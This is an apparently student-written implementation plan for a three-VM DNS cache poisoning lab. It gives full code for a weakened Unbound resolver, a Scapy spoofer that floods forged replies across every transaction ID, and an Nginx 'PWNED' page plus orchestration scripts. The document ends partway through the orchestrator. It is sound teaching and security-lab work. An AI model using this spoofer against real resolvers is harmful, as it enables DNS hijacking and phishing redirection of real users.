# DNS Cache Poisoning Lab — Part 1 Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a reproducible 3-VM virtual lab in which a Python+Scapy attacker poisons the cache of a deliberately-weakened Unbound resolver and redirects a victim's HTTP request to a "PWNED" page. Capture all artifacts (pcap, screenshots, logs) needed for the project report.

**Architecture:** Three Ubuntu 22.04 VirtualBox VMs (`attacker` / `resolver` / `victim`) on a host-only network `192.168.56.0/24`, provisioned by a single Vagrantfile. The resolver runs Unbound with source-port entropy collapsed to a single port (33333) and a black-hole forward-zone for `target.lab`. The attacker runs (a) `spoofer.py`, a two-thread Scapy script that triggers a query and floods spoofed responses sweeping all 65,536 transaction IDs, and (b) Nginx serving a static "PWNED" page. The victim is a stock Ubuntu install with `/etc/resolv.conf` pinned to the resolver. End-to-end orchestration is `lab/scripts/run-part1.sh`.

**Tech Stack:** VirtualBox 7.x, Vagrant, Ubuntu 22.04 (`ubuntu/jammy64` base box, version-pinned), Unbound 1.16+, Python 3.10 + `scapy==2.5.0`, Nginx, `tshark`, bash.

**Spec:** `docs/superpowers/specs/2026-05-05-dns-cache-poisoning-part1-design.md`

**Team timeline:** May 5 → May 8 (4 days). Three roles A/B/C; if 2-person, fold C into A and B. See spec §7 for day-by-day exit criteria.

---

## File Structure

```
/lab
  /vagrant
    Vagrantfile                       # 3 VMs, host-only net, NIC order pinned
    provision-base.sh                 # apt update, common packages
    provision-resolver.sh             # unbound install, config drop, port-pin verify
    provision-attacker.sh             # python3, scapy, nginx, copy spoofer
    provision-victim.sh               # dig, curl, resolv.conf pin
  /resolver
    unbound-vulnerable.conf           # weakened config (Part 1)
    snat-fallback.sh                  # iptables fallback if Unbound port-pin fails
  /attacker
    spoofer.py                        # Scapy two-thread spoofer (CLI)
    requirements.txt                  # scapy==2.5.0
    test_spoofer.py                   # unit tests for packet construction
    nginx/
      index.html                      # PWNED page
      pwned.conf                      # nginx site config
  /victim
    demo.sh                           # baseline → proof, non-interactive
  /scripts
    reset-lab.sh                      # restart unbound, kill spoofer, flush logs
    run-part1.sh                      # full demo orchestration across 3 VMs
    capture-screenshots.sh            # automation aid for screenshot timing
    discover-iface.sh                 # find host-only NIC by IP prefix
/docs
  /specs/2026-05-05-dns-cache-poisoning-part1-design.md     # already written
  /plans/2026-05-05-dns-cache-poisoning-part1.md            # this file
  /screenshots/                       # 01-...png through 07-...png
  /captures/                          # poison.pcap
  /report/
    part1-draft.md                    # report sections 1-6 (Markdown source)
README.md                             # quickstart, architecture, repo map
```

**File-responsibility notes:**
- `spoofer.py` is the centerpiece deliverable. Keep it ≤120 lines, single file, with packet-crafting helpers that are unit-testable without root.
- `run-part1.sh` does no DNS work itself; it only sequences SSH commands across the three VMs and copies artifacts back.
- The `snat-fallback.sh` exists so that if Day 1 Unbound port-pinning verification fails (see spec §3), Person B has a known-good fallback ready in <5 minutes.

---

## Pre-flight (do before Day 1)

### Task 0: Verify Windows host can run VirtualBox

**Files:** none (host-side only)

- [ ] **Step 1: Check Hyper-V status**

```powershell
bcdedit /enum {current} | findstr hypervisorlaunchtype
```

Expected: either no line printed, or `hypervisorlaunchtype Off`. If it says `Auto`, run as Administrator:

```powershell
bcdedit /set hypervisorlaunchtype off
```

Then reboot.

- [ ] **Step 2: Install VirtualBox 7.x and Vagrant**

Download from virtualbox.org and vagrantup.com. Verify:

```bash
VBoxManage --version
vagrant --version
```

Expected: VirtualBox ≥7.0, Vagrant ≥2.4.

- [ ] **Step 3: Pre-fetch the base box**

```bash
vagrant box add ubuntu/jammy64 --provider virtualbox
```

This downloads ~600 MB once; later `vagrant up` calls reuse it.

---

## Chunk 1: Lab provisioning (Day 1, Person A)

Goal: `vagrant up` produces three reachable Ubuntu VMs on `192.168.56.0/24`.

### Task 1: Initialize the repo

**Files:**
- Create: `README.md`
- Create: `.gitignore`

- [ ] **Step 1: Create the repo skeleton**

```bash
cd "C:/Users/Adam/Documents/Network Security DNS Project"
git init
mkdir -p lab/vagrant lab/resolver lab/attacker/nginx lab/victim lab/scripts
mkdir -p docs/screenshots docs/captures docs/report
```

- [ ] **Step 2: Write `.gitignore`**

```
.vagrant/
*.box
docs/screenshots/run-*.log
*.pcap.tmp
__pycache__/
*.pyc
.venv/
```

- [ ] **Step 3: Write `README.md` (quickstart only; full version comes in Chunk 7)**

```markdown
# DNS Cache Poisoning Lab — Part 1

Quickstart:

    cd lab/vagrant && vagrant up
    cd ../scripts && ./run-part1.sh

See `docs/specs/2026-05-05-dns-cache-poisoning-part1-design.md` for the design.
```

- [ ] **Step 4: Initial commit**

```bash
git add README.md .gitignore docs/specs docs/plans
git commit -m "chore: initial repo skeleton with design doc"
```

### Task 2: Write the Vagrantfile

**Files:**
- Create: `lab/vagrant/Vagrantfile`

- [ ] **Step 1: Write the Vagrantfile**

```ruby
# lab/vagrant/Vagrantfile
Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/jammy64"
  config.vm.box_version = "20240319.0.0"   # pin to avoid drift

  config.vm.provider "virtualbox" do |vb|
    vb.memory = 2048
    vb.cpus   = 1
    vb.linked_clone = true
  end

  # NIC order matters: eth0 = NAT (default), eth1 = host-only (192.168.56.x)
  # The host-only adapter must be the SECOND adapter on every VM so that
  # the host-only IP is consistently on the second interface.

  config.vm.define "resolver" do |m|
    m.vm.hostname = "resolver"
    m.vm.network "private_network", ip: "192.168.56.20"
    m.vm.provision "shell", path: "provision-base.sh"
    m.vm.provision "shell", path: "provision-resolver.sh"
    m.vm.synced_folder "../resolver", "/lab/resolver"
    m.vm.synced_folder "../scripts",  "/lab/scripts"
  end

  config.vm.define "attacker" do |m|
    m.vm.hostname = "attacker"
    m.vm.network "private_network", ip: "192.168.56.10"
    m.vm.provision "shell", path: "provision-base.sh"
    m.vm.provision "shell", path: "provision-attacker.sh"
    m.vm.synced_folder "../attacker", "/lab/attacker"
    m.vm.synced_folder "../scripts",  "/lab/scripts"
  end

  config.vm.define "victim" do |m|
    m.vm.hostname = "victim"
    m.vm.network "private_network", ip: "192.168.56.30"
    m.vm.provision "shell", path: "provision-base.sh"
    m.vm.provision "shell", path: "provision-victim.sh"
    m.vm.synced_folder "../victim",  "/lab/victim"
    m.vm.synced_folder "../scripts", "/lab/scripts"
  end
end
```

- [ ] **Step 2: Write `lab/vagrant/provision-base.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y curl tcpdump tshark net-tools dnsutils iptables
# Allow non-root tshark
groupadd -f wireshark
usermod -aG wireshark vagrant
chgrp wireshark /usr/bin/dumpcap
chmod 4750 /usr/bin/dumpcap
```

- [ ] **Step 3: Stub the per-VM provisioners (filled in later chunks)**

```bash
# lab/vagrant/provision-resolver.sh
#!/usr/bin/env bash
set -euo pipefail
echo "resolver provisioning placeholder"
```

```bash
# lab/vagrant/provision-attacker.sh
#!/usr/bin/env bash
set -euo pipefail
echo "attacker provisioning placeholder"
```

```bash
# lab/vagrant/provision-victim.sh
#!/usr/bin/env bash
set -euo pipefail
echo "victim provisioning placeholder"
```

- [ ] **Step 4: Make all scripts executable**

```bash
chmod +x lab/vagrant/*.sh
```

### Task 3: Bring up the lab and verify connectivity

- [ ] **Step 1: `vagrant up`**

```bash
cd lab/vagrant
vagrant up
```

Expected: three VMs boot. ~5–10 minutes on first run. Watch for any "no host-only adapter" errors — if they appear, manually create the adapter in VirtualBox GUI: File → Host Network Manager → Create.

- [ ] **Step 2: Verify each VM is reachable**

```bash
vagrant ssh resolver -c "ip -4 addr show | grep 192.168.56"
vagrant ssh attacker -c "ip -4 addr show | grep 192.168.56"
vagrant ssh victim   -c "ip -4 addr show | grep 192.168.56"
```

Expected: each prints exactly one line with its assigned IP (`.20`, `.10`, `.30` respectively).

- [ ] **Step 3: Verify mesh connectivity**

```bash
vagrant ssh victim -c "ping -c 2 192.168.56.20 && ping -c 2 192.168.56.10"
vagrant ssh attacker -c "ping -c 2 192.168.56.20 && ping -c 2 192.168.56.30"
```

Expected: 0% packet loss on all four pings.

- [ ] **Step 4: Capture topology screenshot `01-topology.png`**

On any VM:

```bash
vagrant ssh resolver -c "ip -4 addr show; ip route"
```

Screenshot the terminal output. Save as `docs/screenshots/01-topology.png`.

- [ ] **Step 5: Commit Chunk 1**

```bash
git add lab/vagrant/ README.md .gitignore docs/screenshots/01-topology.png
git commit -m "feat(lab): vagrant provisions 3 ubuntu vms on 192.168.56.0/24"
```

---

## Chunk 2: Resolver — weakened Unbound (Day 1, Person B)

Goal: Unbound serves DNS on `192.168.56.20:53` with source port pinned to 33333. Baseline `dig www.target.lab` returns SERVFAIL after ~5 s.

### Task 4: Write the vulnerable Unbound config

**Files:**
- Create: `lab/resolver/unbound-vulnerable.conf`

- [ ] **Step 1: Write `lab/resolver/unbound-vulnerable.conf`**

```yaml
# Deliberately-weakened Unbound configuration for Part 1.
# See docs/specs/2026-05-05-dns-cache-poisoning-part1-design.md §3.
server:
  verbosity: 1
  interface: 192.168.56.20
  port: 53
  access-control: 192.168.56.0/24 allow
  do-not-query-localhost: no

  # WEAKENING — disable defenses
  use-caps-for-id: no                  # no 0x20 case randomization
  outgoing-range: 1                    # one outbound socket
  outgoing-port-avoid: "0-65535"       # avoid all ports...
  outgoing-port-permit: "33333"        # ...except this one (pinned)
  harden-glue: no
  harden-referral-path: no
  qname-minimisation: no

  # Caching: positive answers stick for at least 60 s after poison
  cache-min-ttl: 60
  cache-max-ttl: 86400

  # No DNSSEC validator loaded (Part 3 will swap to "validator iterator")
  module-config: "iterator"

  logfile: "/var/log/unbound/unbound.log"
  log-queries: yes
  log-replies: yes

forward-zone:
  name: "target.lab."
  forward-addr: 192.168.56.99          # unassigned IP — race window opens here
```

### Task 5: Resolver provisioner

**Files:**
- Modify: `lab/vagrant/provision-resolver.sh`

- [ ] **Step 1: Replace placeholder with real provisioner**

```bash
#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get install -y unbound

# Allow loose reverse-path filtering so spoofed-source packets are accepted
# (rp_filter=1 would drop them because src=192.168.56.99 has no route).
cat > /etc/sysctl.d/99-lab.conf <<'EOF'
net.ipv4.conf.all.rp_filter = 0
net.ipv4.conf.default.rp_filter = 0
EOF
sysctl --system >/dev/null

# systemd-resolved must not own :53
systemctl disable --now systemd-resolved || true
# Ubuntu's stub resolver leaves a symlinked resolv.conf; replace it
rm -f /etc/resolv.conf
echo 'nameserver 127.0.0.1' > /etc/resolv.conf

# Drop our config and disable the default
install -o root -g root -m 0644 \
  /lab/resolver/unbound-vulnerable.conf \
  /etc/unbound/unbound.conf.d/lab.conf

# Comment out the 'include' for default forwarders if any
sed -i 's|^include:|#include:|' /etc/unbound/unbound.conf || true

mkdir -p /var/log/unbound
chown unbound:unbound /var/log/unbound

# Validate before starting
unbound-checkconf
systemctl enable --now unbound
systemctl status unbound --no-pager | head -n 5
```

- [ ] **Step 2: Re-provision the resolver**

```bash
cd lab/vagrant
vagrant provision resolver
```

Expected: `unbound-checkconf` prints no errors; service is `active (running)`.

If `unbound-checkconf` fails on `outgoing-port-permit` syntax: see Task 6 (iptables fallback).

### Task 6: Verify source-port pinning (CRITICAL Day 1 gate)

**Files:**
- Create: `lab/resolver/snat-fallback.sh` (only used if Task 5 verification fails)

- [ ] **Step 1: Start tcpdump on resolver**

In one shell:

```bash
vagrant ssh resolver -c "sudo tcpdump -i any -nn 'udp and port 53' -c 6"
```

- [ ] **Step 2: Trigger an outbound query from the victim**

In another shell:

```bash
vagrant ssh victim -c "dig @192.168.56.20 www.target.lab +time=2 +tries=1 || true"
```

- [ ] **Step 3: Read the tcpdump output for the outbound packet**

Look for a line like:
```
IP 192.168.56.20.33333 > 192.168.56.99.53: ... A? www.target.lab.
```

Expected: source port = `33333`. If it's a different port (e.g., `54321`), Unbound is not honoring the port-pin on this version. Apply the iptables fallback:

- [ ] **Step 4 (only if Step 3 failed): Write the SNAT fallback**

Create `lab/resolver/snat-fallback.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
# Force all outbound DNS to source port 33333.
iptables -t nat -F OUTPUT
iptables -t nat -A OUTPUT -p udp --dport 53 \
         -j SNAT --to-source :33333
# Persist
apt-get install -y iptables-persistent
netfilter-persistent save
```

Then on the resolver:

```bash
vagrant ssh resolver -c "sudo bash /lab/resolver/snat-fallback.sh"
```

Re-run Steps 1–3. Expected: source port now `33333`.

- [ ] **Step 5: Commit**

```bash
git add lab/resolver/ lab/vagrant/provision-resolver.sh
git commit -m "feat(resolver): weakened unbound config, source port pinned to 33333"
```

### Task 7: Capture baseline screenshot

- [ ] **Step 1: SERVFAIL baseline**

```bash
vagrant ssh victim -c "dig @192.168.56.20 www.target.lab +short; \
                       dig @192.168.56.20 www.target.lab"
```

Expected: `+short` returns nothing (or empty); the verbose form shows `status: SERVFAIL` after ~5 s.

- [ ] **Step 2: Verify general resolution still works**

```bash
vagrant ssh victim -c "dig @192.168.56.20 example.com +short"
```

Expected: an IP address (the resolver still talks to the real internet for non-`target.lab` queries — important for realism in the report).

- [ ] **Step 3: Save screenshot `02-resolver-baseline.png`**

Screenshot the SERVFAIL output. Save as `docs/screenshots/02-resolver-baseline.png`.

- [ ] **Step 4: Commit**

```bash
git add docs/screenshots/02-resolver-baseline.png
git commit -m "docs: capture pre-attack SERVFAIL baseline"
```

---

## Chunk 3: Attacker — Spoofer (Day 2, Person A)

Goal: `spoofer.py` poisons the resolver's cache for `www.target.lab` within 30 seconds, repeatably, and exits with `[+] poisoned in N attempts (T seconds)`.

**TDD note:** Packet construction is unit-testable without root; the integration race is verified on the live lab. Write Scapy helpers as pure functions that take inputs and return packet objects, then test those.

### Task 8: Project skeleton + first failing test

**Files:**
- Create: `lab/attacker/requirements.txt`
- Create: `lab/attacker/spoofer.py` (skeleton)
- Create: `lab/attacker/test_spoofer.py`

- [ ] **Step 1: `requirements.txt`**

```
scapy==2.5.0
```

- [ ] **Step 2: Write the failing test**

```python
# lab/attacker/test_spoofer.py
"""Unit tests for spoofer packet construction. Run: pytest test_spoofer.py"""
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
import spoofer


def test_build_spoofed_response_has_correct_5tuple():
    pkt = spoofer.build_spoofed_response(
        src_ip="192.168.56.99",
        dst_ip="192.168.56.20",
        dst_port=33333,
        txid=0x4242,
        qname="www.target.lab",
        spoof_ip="192.168.56.10",
    )
    assert pkt[IP].src == "192.168.56.99"
    assert pkt[IP].dst == "192.168.56.20"
    assert pkt[UDP].sport == 53
    assert pkt[UDP].dport == 33333
    assert pkt[DNS].id == 0x4242
    assert pkt[DNS].qr == 1                       # response
    assert pkt[DNS].aa == 1                       # authoritative
    assert pkt[DNS].qd.qname == b"www.target.lab."
    assert pkt[DNS].an.rdata == "192.168.56.10"
    assert pkt[DNS].an.ttl == 86400


def test_build_trigger_query_targets_resolver():
    pkt = spoofer.build_trigger_query(
        resolver_ip="192.168.56.20",
        qname="www.target.lab",
    )
    assert pkt[IP].dst == "192.168.56.20"
    assert pkt[UDP].dport == 53
    assert pkt[DNS].qr == 0                       # query
    assert pkt[DNS].qd.qname == b"www.target.lab."
```

- [ ] **Step 3: Stub `spoofer.py` so the import succeeds but tests fail**

```python
# lab/attacker/spoofer.py
"""DNS cache poisoning spoofer. See docs/specs/...part1-design.md §4."""
def build_spoofed_response(*args, **kwargs):
    raise NotImplementedError

def build_trigger_query(*args, **kwargs):
    raise NotImplementedError
```

- [ ] **Step 4: Run tests — confirm they fail**

On the host (or any machine with Python+Scapy installed):

```bash
cd lab/attacker
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt pytest
pytest test_spoofer.py -v
```

Expected: 2 tests, both FAIL with `NotImplementedError`.

### Task 9: Implement packet builders

**Files:**
- Modify: `lab/attacker/spoofer.py`

- [ ] **Step 1: Implement `build_spoofed_response`**

```python
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR

def build_spoofed_response(src_ip, dst_ip, dst_port, txid,
                            qname, spoof_ip, ttl=86400):
    """Forged reply impersonating the forwarder."""
    return (
        IP(src=src_ip, dst=dst_ip)
        / UDP(sport=53, dport=dst_port)
        / DNS(
            id=txid,
            qr=1, aa=1, ra=1, rd=1,
            qd=DNSQR(qname=qname, qtype="A"),
            an=DNSRR(rrname=qname, type="A",
                     rdata=spoof_ip, ttl=ttl),
        )
    )
```

- [ ] **Step 2: Implement `build_trigger_query`**

```python
def build_trigger_query(resolver_ip, qname, src_port=0):
    return (
        IP(dst=resolver_ip)
        / UDP(sport=src_port or 0, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
    )
```

- [ ] **Step 3: Run tests — confirm they pass**

```bash
pytest test_spoofer.py -v
```

Expected: 2 passed.

- [ ] **Step 4: Commit**

```bash
git add lab/attacker/spoofer.py lab/attacker/test_spoofer.py lab/attacker/requirements.txt
git commit -m "feat(attacker): packet builders with unit tests"
```

### Task 10: Add the runtime threads + CLI

**Files:**
- Modify: `lab/attacker/spoofer.py`

- [ ] **Step 1: Add `flood`, `trigger`, `verify_poisoned`, and `main`**

```python
import argparse
import socket
import sys
import threading
import time
from scapy.all import send, sr1


def flood(stop_event, src_ip, dst_ip, dst_port, qname, spoof_ip):
    """Spray spoofed replies sweeping all 65,536 transaction IDs."""
    sent = 0
    while not stop_event.is_set():
        for txid in range(65536):
            if stop_event.is_set():
                return sent
            pkt = build_spoofed_response(
                src_ip, dst_ip, dst_port, txid, qname, spoof_ip)
            send(pkt, verbose=False)
            sent += 1
    return sent


def trigger(stop_event, resolver_ip, qname, period=6.0):
    """Force the resolver to emit an outbound query, slowly."""
    fired = 0
    while not stop_event.is_set():
        send(build_trigger_query(resolver_ip, qname), verbose=False)
        fired += 1
        # Wake every 0.5s so we can stop promptly
        for _ in range(int(period / 0.5)):
            if stop_event.is_set():
                return fired
            time.sleep(0.5)
    return fired


def verify_poisoned(resolver_ip, qname, expected_ip, timeout=2):
    """Re-query the resolver via dig (UDP) and check the answer."""
    import subprocess
    out = subprocess.run(
        ["dig", f"@{resolver_ip}", qname, "+short", f"+time={timeout}",
         "+tries=1"],
        capture_output=True, text=True, timeout=timeout + 2,
    )
    return expected_ip in out.stdout


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--resolver",  default="192.168.56.20")
    ap.add_argument("--target",    default="www.target.lab")
    ap.add_argument("--spoof-ip",  default="192.168.56.10")
    ap.add_argument("--src-ip",    default="192.168.56.99",
                    help="impersonated forwarder IP")
    ap.add_argument("--src-port",  type=int, default=33333,
                    help="resolver's pinned source port")
    ap.add_argument("--max-seconds", type=int, default=60)
    args = ap.parse_args()

    stop = threading.Event()
    t_flood = threading.Thread(
        target=flood,
        args=(stop, args.src_ip, args.resolver, args.src_port,
              args.target, args.spoof_ip),
        daemon=True,
    )
    t_trigger = threading.Thread(
        target=trigger,
        args=(stop, args.resolver, args.target),
        daemon=True,
    )

    t_flood.start()
    t_trigger.start()

    start = time.time()
    poisoned = False
    while time.time() - start < args.max_seconds:
        if verify_poisoned(args.resolver, args.target, args.spoof_ip):
            poisoned = True
            break
        time.sleep(2)

    stop.set()
    elapsed = time.time() - start

    if poisoned:
        print(f"[+] poisoned in {elapsed:.1f} seconds "
              f"(target={args.target} → {args.spoof_ip})")
        sys.exit(0)
    else:
        print(f"[-] FAILED to poison within {args.max_seconds}s")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Update tests so the new code does not break unit tests**

The new functions don't need unit tests (they're integration-tested by the live lab), but verify the existing tests still pass:

```bash
pytest test_spoofer.py -v
```

Expected: 2 passed.

- [ ] **Step 3: Commit**

```bash
git add lab/attacker/spoofer.py
git commit -m "feat(attacker): two-thread spoofer with CLI and verification"
```

### Task 11: Wire spoofer into attacker provisioner

**Files:**
- Modify: `lab/vagrant/provision-attacker.sh`

- [ ] **Step 1: Replace placeholder with real provisioner**

```bash
#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get install -y python3 python3-pip python3-venv

# Install Scapy globally so root invocations work
pip3 install --break-system-packages scapy==2.5.0

# Allow non-root capture; spoofer still needs root for raw sockets
setcap cap_net_raw,cap_net_admin=eip "$(readlink -f "$(which python3)")" || true
```

- [ ] **Step 2: Re-provision attacker**

```bash
cd lab/vagrant
vagrant provision attacker
```

- [ ] **Step 3: Smoke-test spoofer help**

```bash
vagrant ssh attacker -c "sudo python3 /lab/attacker/spoofer.py --help"
```

Expected: argparse help text printed.

### Task 12: Live integration — first real poisoning

- [ ] **Step 1: Reset resolver cache**

```bash
vagrant ssh resolver -c "sudo systemctl restart unbound"
```

- [ ] **Step 2: Run spoofer**

```bash
vagrant ssh attacker -c "sudo python3 /lab/attacker/spoofer.py"
```

Expected within 30 s:
```
[+] poisoned in 12.3 seconds (target=www.target.lab → 192.168.56.10)
```

If it times out at 60 s: see Troubleshooting below.

- [ ] **Step 3: Troubleshooting (only if Step 2 failed)**

Symptoms → fixes:
- **`[-] FAILED` after 60 s, no spoofs reach resolver** → on resolver, run `sudo tcpdump -i any -nn 'udp and port 53'` while spoofer runs. If you see no packets at all from `192.168.56.99`, the attacker is sending them but the resolver's kernel is dropping them via reverse-path filter. Disable it on the resolver: `sudo sysctl -w net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.eth1.rp_filter=0`. Persist by adding both lines to `/etc/sysctl.d/99-lab.conf`. Re-run.
- **Resolver itself can't send legitimate query (ARP fails for .99)** → that's intentional (the unassigned IP is supposed to silently swallow queries). If you instead see ICMP unreachables flooding the pcap, add a static neighbor entry to silence them: `sudo ip neigh add 192.168.56.99 lladdr 02:00:00:00:00:99 dev eth1 nud permanent`.
- **Spoofs arrive but resolver rejects them** → tcpdump on resolver, confirm dst port matches the pinned source port. If not, the iptables SNAT fallback in Task 6 may have been undone by a reboot — re-apply.
- **Spoofs arrive with right dport but resolver still SERVFAILs** → check `sudo tail /var/log/unbound/unbound.log`. If you see `unwanted reply, possibly poison attempt` Unbound is rejecting on a field beyond txid (e.g., qname mismatch). Confirm the qname in the spoof matches exactly, including trailing dot.

If you spend >2 hours debugging Scapy specifically, switch to the `dnspython` raw-socket sender (escape hatch in spec §8 risks).

- [ ] **Step 4: Capture screenshot `03-spoofer-running.png`**

Screenshot the terminal showing `[+] poisoned in N seconds`. Save to `docs/screenshots/03-spoofer-running.png`.

- [ ] **Step 5: Commit provisioner + screenshot**

```bash
git add lab/vagrant/provision-attacker.sh docs/screenshots/03-spoofer-running.png
git commit -m "feat(attacker): provisioner + first successful poisoning"
```

---

## Chunk 4: Attacker — PWNED web server (Day 2, Person B)

Goal: `curl http://192.168.56.10/` returns the PWNED page; once cache is poisoned, `curl http://www.target.lab/` does the same.

### Task 13: Static page + Nginx site

**Files:**
- Create: `lab/attacker/nginx/index.html`
- Create: `lab/attacker/nginx/pwned.conf`

- [ ] **Step 1: Write `index.html`**

```html
<!doctype html>
<html><head><meta charset="utf-8"><title>PWNED</title>
<style>
  body { font-family: monospace; background: #111; color: #f33;
         text-align: center; padding-top: 80px; }
  h1 { font-size: 4em; }
</style></head><body>
<h1>YOU'VE BEEN PWNED</h1>
<p>This page was served from 192.168.56.10 because the DNS cache for
   <strong>www.target.lab</strong> on resolver 192.168.56.20 was poisoned.</p>
<p>A real attacker would serve a phishing clone of the bank you thought
   you were visiting. Always validate DNS responses with DNSSEC.</p>
</body></html>
```

- [ ] **Step 2: Write `pwned.conf`**

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    root /var/www/pwned;
    index index.html;
    access_log /var/log/nginx/pwned.access.log;
}
```

### Task 14: Wire Nginx into attacker provisioner

**Files:**
- Modify: `lab/vagrant/provision-attacker.sh`

- [ ] **Step 1: Append Nginx setup to provisioner**

```bash
# --- Nginx PWNED page ---
apt-get install -y nginx
mkdir -p /var/www/pwned
install -o root -g root -m 0644 \
  /lab/attacker/nginx/index.html /var/www/pwned/index.html
install -o root -g root -m 0644 \
  /lab/attacker/nginx/pwned.conf /etc/nginx/sites-available/pwned
ln -sf /etc/nginx/sites-available/pwned /etc/nginx/sites-enabled/pwned
rm -f /etc/nginx/sites-enabled/default
nginx -t
systemctl restart nginx
```

- [ ] **Step 2: Re-provision attacker**

```bash
vagrant provision attacker
```

- [ ] **Step 3: Verify Nginx is reachable**

```bash
vagrant ssh victim -c "curl -s http://192.168.56.10/ | head -n 3"
```

Expected: HTML output containing `<title>PWNED</title>`.

- [ ] **Step 4: Commit**

```bash
git add lab/attacker/nginx/ lab/vagrant/provision-attacker.sh
git commit -m "feat(attacker): nginx serves PWNED page on :80"
```

---

## Chunk 5: Victim + demo orchestration (Day 2 end / Day 3, Person B + C)

Goal: A single `lab/scripts/run-part1.sh` from the host completes the entire demo: starts pcap, runs spoofer, runs `demo.sh` on victim, asserts on the result, copies pcap back.

### Task 15: Victim provisioner + resolv.conf pin

**Files:**
- Modify: `lab/vagrant/provision-victim.sh`

- [ ] **Step 1: Replace placeholder**

```bash
#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get install -y dnsutils curl

# Disable systemd-resolved so /etc/resolv.conf can be static
systemctl disable --now systemd-resolved || true
rm -f /etc/resolv.conf
echo 'nameserver 192.168.56.20' > /etc/resolv.conf
chattr +i /etc/resolv.conf
```

- [ ] **Step 2: Re-provision victim**

```bash
vagrant provision victim
```

- [ ] **Step 3: Verify**

```bash
vagrant ssh victim -c "cat /etc/resolv.conf && lsattr /etc/resolv.conf"
```

Expected: `nameserver 192.168.56.20`, `lsattr` shows `i` flag set.

```bash
vagrant ssh victim -c "dig +short example.com"
```

Expected: an IP (proves victim is reaching `192.168.56.20` for general DNS).

### Task 16: `victim/demo.sh` (non-interactive, asserting)

**Files:**
- Create: `lab/victim/demo.sh`

- [ ] **Step 1: Write `demo.sh`**

```bash
#!/usr/bin/env bash
# Non-interactive proof of redirection. Run AFTER spoofer reports success.
# Exit 0 if poisoned, non-zero otherwise.
set -uo pipefail

RESOLVER="${RESOLVER:-192.168.56.20}"
TARGET="${TARGET:-www.target.lab}"
EXPECT="${EXPECT:-192.168.56.10}"
LOGDIR="${LOGDIR:-/lab/victim/logs}"
mkdir -p "$LOGDIR"
LOG="$LOGDIR/run-$(date +%Y%m%d-%H%M%S).log"

{
  echo "=== Phase 1 — Post-attack dig ==="
  dig "@$RESOLVER" "$TARGET" +short
  echo
  echo "=== Phase 2 — HTTP fetch ==="
  curl -sS -m 5 "http://$TARGET/" | head -n 8
} | tee "$LOG"

# Assertion
ANSWER=$(dig "@$RESOLVER" "$TARGET" +short)
if [[ "$ANSWER" == "$EXPECT" ]]; then
  echo "[+] PASS — $TARGET resolves to $EXPECT (poisoned)"
  exit 0
else
  echo "[-] FAIL — got '$ANSWER', expected '$EXPECT'"
  exit 2
fi
```

- [ ] **Step 2: Make executable**

```bash
chmod +x lab/victim/demo.sh
```

### Task 17: `reset-lab.sh`

**Files:**
- Create: `lab/scripts/reset-lab.sh`

- [ ] **Step 1: Write `reset-lab.sh`**

```bash
#!/usr/bin/env bash
# Restart unbound on resolver and kill any lingering spoofer / tshark.
# Run on the host (uses vagrant ssh).
set -euo pipefail
cd "$(dirname "$0")/../vagrant"

echo "[*] Restarting unbound on resolver"
vagrant ssh resolver -c "sudo systemctl restart unbound" \
  || { echo "resolver restart failed"; exit 1; }

echo "[*] Killing spoofer.py + tshark on attacker/resolver"
vagrant ssh attacker -c "sudo pkill -f spoofer.py || true"
vagrant ssh resolver -c "sudo pkill tshark || true"

echo "[*] Lab reset OK"
```

- [ ] **Step 2: Make executable and test**

```bash
chmod +x lab/scripts/reset-lab.sh
./lab/scripts/reset-lab.sh
```

Expected: each step prints OK, no errors.

### Task 18: `discover-iface.sh` helper

**Files:**
- Create: `lab/scripts/discover-iface.sh`

- [ ] **Step 1: Write helper**

```bash
#!/usr/bin/env bash
# Print the host-only adapter name on the current VM.
ip -o -4 addr show \
  | awk '$4 ~ /^192\.168\.56\./ {print $2; exit}'
```

- [ ] **Step 2: Smoke test on a VM**

```bash
chmod +x lab/scripts/discover-iface.sh
vagrant ssh resolver -c "/lab/scripts/discover-iface.sh"
```

Expected: the host-only NIC name (typically `eth1` or `enp0s8`).

### Task 19: `run-part1.sh` orchestrator

**Files:**
- Create: `lab/scripts/run-part1.sh`

- [ ] **Step 1: Write the orchestrator**

```bash
#!/usr/bin/env bash
# End-to-end Part 1 demo. Run on the host.
#
#   ./run-part1.sh             # default: capture pcap, attempt poison, prove
#
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE/../vagrant"

PCAP_OUT="$HERE/../../docs/captures/poison.pcap"
mkdir -p "$(dirname "$PCAP_OUT")"

echo "[1/5] Reset lab"
"$HERE/reset-lab.sh"

echo "[2/5] Start tshark on resolver (background)"
vagrant ssh resolver -c "
  IF=\$(/lab/scripts/discover-iface.sh)
  sudo nohup tshark -i \$IF -w /tmp/poison.pcap \
       -f 'port 53 or host 192.168.56.10' \
       >/tmp/tshark.log 2>&1 &
  echo \$! > /tmp/tshark.pid
  sleep 1
"

echo "[3/5] Run spoofer on attacker (foreground)"
set +e
vagrant ssh attacker -c "sudo python3 /lab/attacker/spoofer.py"
SPOOFER_RC=$?
set -e

echo "[4/5] Run demo.sh on victim"
set +e
vagrant ssh victim -c "/lab/victim/demo.sh"
VICTIM_RC=$?
set -e

echo "[5/5] Stop tshark and copy pcap"
vagrant ssh resolver -c "
  sudo kill \$(cat /tmp/tshark.pid) 2>/dev/null || true
  sudo chmod 0644 /tmp/poison.pcap
"
